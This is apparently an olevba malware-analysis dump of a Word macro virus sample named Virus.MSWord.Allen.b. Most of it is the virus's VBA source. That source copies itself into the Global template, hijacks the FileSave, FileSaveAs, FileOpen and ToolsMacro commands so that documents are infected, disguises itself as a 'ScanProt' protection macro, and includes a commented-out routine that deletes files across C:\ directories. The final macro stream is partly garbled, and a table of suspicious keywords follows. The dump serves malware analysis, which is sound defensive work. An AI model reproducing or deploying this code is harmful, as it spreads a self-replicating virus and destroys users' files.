olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Abort
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:Autoexec"
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:RpAE"
    sMacro$ = sMe$ + ":AutoOpen"
    WordBasic.MacroCopy sMacro$, "Global:RpAO"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:FileSave"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:RpFS"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:RpFSA"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:FileOpen"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:RpFO"
    sMacro$ = sMe$ + ":RpTC"
    WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize"
    sMacro$ = sMe$ + ":RpTM"
    WordBasic.MacroCopy sMacro$, "Global:ToolsMacro"
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFSA.bas 
in file: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9 - OLE stream: 'Macros/VBA/RpFSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFSA.MAIN"
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg

If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFS.bas 
in file: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9 - OLE stream: 'Macros/VBA/RpFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFS.MAIN"
Dim sMe$
Dim sTMacro$
WordBasic.FileSave
On Error GoTo -1: On Error GoTo Bail

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFO.bas 
in file: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9 - OLE stream: 'Macros/VBA/RpFO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg

WordBasic.FileOpen dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
WordBasic.MsgBox "Thank's for joining with us !", "@Rapi.Kom"
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileOpen dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpAE.bas 
in file: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9 - OLE stream: 'Macros/VBA/RpAE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'tgl = Day(Now())
'jam = Hour(Now())
'If tgl < 20 Then Goto Selamat
'If jam < 11 Then Goto Selamat
'Dim Sehat$(20)
'Dim Subur$(20)
'ChDir "C:\"
'Dim subdirs$(CountDirectories())
'subdirs$(0) = "[..]"
'For i = 1 To CountDirectories()
'   Print "Reading menu...Please wait !"
'   Subdirs$(i) = UCase$(GetDirectory$(i))
'   If Subdirs$(i) = "WINDOWS" Then Goto lewat
'   If Subdirs$(i) = "WINWORD" Then Goto lewat
'   If Subdirs$(i) = "WINWORD6" Then Goto lewat
'   Ojek$ = "C:\" + Subdirs$(i) + "\*.*"
'   Kill ojek$
'   ChDir  Subdirs$(i)
'       Subur$(0) = "[..]"
'       For a = 1 To CountDirectories()
'           Print "Reading menu...Please wait !"
'           subur$(a) = UCase$(GetDirectory$(a))
'           If subur$(a) = "WINWORD" Then Goto pass
'           If subur$(a) = " WINWORD6" Then Goto pass
'           Penyakit$ = "C:\" + subdirs$(i) + "\" + subur$(a) + "\*.*"
'           Kill Penyakit Else / CheckDialog Single Integer WordBasic.Input Double Private Declare Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let /
                                ; Double Alias 'ks ..........................................................................   70"&chr(13)&"   BAB V   :   PEMBAHA Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let / WordBasic.Input Is <> / / / / Private Declare Let Else Private Declare                                                                                                 29545  Else
29537  Else

gan XRD .......................þ
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Allen.b-fe366cdcd4db913429463610ab3c419c1101a0d9 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

